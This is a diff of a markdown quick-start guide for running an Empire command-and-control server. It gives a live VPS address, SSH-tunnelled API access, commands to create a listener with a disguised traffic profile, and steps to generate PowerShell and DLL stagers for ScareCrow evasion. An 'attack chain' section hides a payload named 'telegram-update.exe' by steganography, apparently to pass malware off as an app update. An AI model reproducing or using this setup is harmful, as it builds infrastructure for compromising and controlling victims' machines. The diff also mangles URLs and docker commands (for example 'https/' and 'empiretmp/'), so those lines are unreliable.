@@ -1,31 +1,31 @@
-# 🚀 Empire C2 - QUICK START GUIDE
+# Empire C2 - QUICK START GUIDE
 
-## ✅ CURRENT STATUS (WORKING!)
+## CURRENT STATUS (WORKING!)
 
 - **Empire Server**: Running locally in Docker
-- **Starkiller UI**: https://161-35-155-3.sslip.io ✅
-- **Empire API**: http://127.0.0.1:1337 (forwarded to VPS)
+- **Starkiller UI**: https/161-35-155-3.sslip.io
+- **Empire API**: http/127.0.0.1:1337 (forwarded to VPS)
 - **SSH Tunnels**: Active and working
 
-## 🌐 ACCESS POINTS
+## ACCESS POINTS
 
 ### Starkiller Web UI
 ```
-URL: https://161-35-155-3.sslip.io
+URL: https/161-35-155-3.sslip.io
 ```
 
 ### Empire API (Local)
 ```
-URL: http://127.0.0.1:1337/api/v2/
+URL: http/127.0.0.1:1337/api/v2/
 ```
 
 ### Empire API (Via VPS)
 ```
-URL: https://161-35-155-3.sslip.io/api/
+URL: https/161-35-155-3.sslip.io/api/
 Auth: Basic Auth (configured in nginx)
 ```
 
-## 🔧 EMPIRE COMMANDS
+## EMPIRE COMMANDS
 
 ### Access Empire CLI
 ```bash
@@ -49,7 +49,7 @@ docker logs empire
 docker restart empire
 ```
 
-## 📡 CREATE LISTENERS
+## CREATE LISTENERS
 
 ```python
 # Access Empire client
@@ -58,7 +58,7 @@ docker exec -it empire python3 /opt/Empire/empire.py client
 # Once in Empire CLI:
 uselistener http
 set Name main_listener
-set Host https://161-35-155-3.sslip.io
+set Host https/161-35-155-3.sslip.io
 set Port 443
 set DefaultProfile /admin/get.php,/news.php,/login/process.php|Mozilla/5.0
 execute
@@ -67,7 +67,7 @@ execute
 listeners
 ```
 
-## 🎯 GENERATE STAGERS
+## GENERATE STAGERS
 
 ```python
 # Windows PowerShell Stager
@@ -78,7 +78,7 @@ execute
 
 # Windows DLL (for ScareCrow)
 usestager windows/dll
-set Listener main_listener  
+set Listener main_listener
 set OutFile /tmp/empire.dll
 execute
 
@@ -87,18 +87,18 @@ execute
 
 ```bash
 # From host (outside container)
-docker cp empire:/tmp/launcher.bat ./stagers/
-docker cp empire:/tmp/empire.dll ./stagers/
+docker cp empiretmp/launcher.bat ./stagers/
+docker cp empiretmp/empire.dll ./stagers/
 ```
 
-## 🔐 DEFAULT CREDENTIALS
+## DEFAULT CREDENTIALS
 
 Check inside Empire container:
 ```bash
 docker exec -it empire cat /root/.local/share/powershell-empire/config.yaml | grep -A 5 defaults
 ```
 
-## 🛠️ TROUBLESHOOTING
+## ️ TROUBLESHOOTING
 
 ### Starkiller Won't Load
 ```bash
@@ -131,7 +131,7 @@ docker exec -it empire python3 /opt/Empire/empire.py client
 ssh root@161.35.155.3 "ufw status"
 ```
 
-## ⚡ QUICK ACTIONS
+## QUICK ACTIONS
 
 ### Create Complete Attack Chain
 ```bash
@@ -150,7 +150,7 @@ python3 large-stego-system.py embed --payload payloads/telegram-update.exe --out
 # 7. Test!
 ```
 
-## 📱 USEFUL COMMANDS
+## USEFUL COMMANDS
 
 ```bash
 # Check what's running on ports
@@ -169,10 +169,10 @@ ssh root@161.35.155.3
 ps aux | grep ssh | grep 1337
 ```
 
-## 🎯 NEXT STEPS
+## NEXT STEPS
 
-1. ✅ Empire is running
-2. ✅ Starkiller is accessible
+1. Empire is running
+2. Starkiller is accessible
 3. ⏳ Create HTTP/HTTPS listeners
 4. ⏳ Generate stagers
 5. ⏳ Integrate with ScareCrow
